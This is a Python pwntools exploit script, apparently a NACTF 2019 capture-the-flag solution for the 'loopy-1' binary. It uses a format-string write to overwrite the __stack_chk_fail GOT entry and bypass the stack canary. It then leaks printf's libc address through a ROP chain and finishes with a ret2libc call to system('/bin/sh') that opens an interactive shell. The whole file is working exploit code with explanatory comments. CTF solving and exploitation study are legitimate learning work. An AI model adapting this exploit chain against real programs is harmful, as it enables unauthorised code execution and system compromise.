#!/usr/bin/env python3
from pwn import *


context.binary = './loopy-1'
p = process('./loopy-1')
libc = ELF('/usr/lib32/libc.so.6')
# p = remote('shell.2019.nactf.com', 31732)
# libc = ELF('./libc.so.6')

p.recvuntil('Type something>')

stack_chk_fail_got = context.binary.got['__stack_chk_fail']
printf_plt = context.binary.plt['printf']
printf_got = context.binary.got['printf']
vuln = context.binary.symbols['vuln']

# Overwrite address of __stack_chk_fail () GOT
# with ret ROPgadget (0x0804900a)
# to render it useless:

# Insert address to first 2 bytes of stack_chk_fail_got into 7th param..
payload = p32(stack_chk_fail_got).decode('L1')
# Insert address to last 2 bytes of stack_chk_fail_got into 8th param.
payload += p32(stack_chk_fail_got + 2).decode('L1')
# Find number of chars to write 900a.
payload += '%7$36866x'  # We use printf formatting to pad these characters.
# Write number of chars printed so far (900a) into pointer at 7th param.
payload += '%7$hn'
# Find number of chars to write 10804 since number of chars is already > 804.
payload += '%8$30714x'  # We use hn to only write 2 bytes.
# Write number of chars printed so far (10804) into pointer at 8th.
payload += '%8$hn'  # But only 0804 will be written because of hn.
# Fill the buffer until return pointer.
payload += 'A' * 44

# Same as Loopy #1 with exception of
# 80 A's printed instead of 76
# because the stack canary takes up 4 bytes
payload += (
    p32(printf_plt).decode('L1')
    + p32(vuln).decode('L1')
    + p32(printf_got).decode('L1')
)

p.sendline(payload)

p.recvuntil(p32(printf_got))
leak = p.recv(4)
printf_libc = u32(leak)
print('printf@libc: ', hex(printf_libc))

libc.address = printf_libc - libc.symbols['printf']
bin_sh = libc.search(b'/bin/sh').__next__()
system = libc.symbols['system']

p.recvuntil('Type something>')
payload = (
    'A' * 80
    + p32(system).decode('L1')
    + 'AAAA'
    + p32(bin_sh).decode('L1')
)
p.sendline(payload)

p.interactive()
p.close()
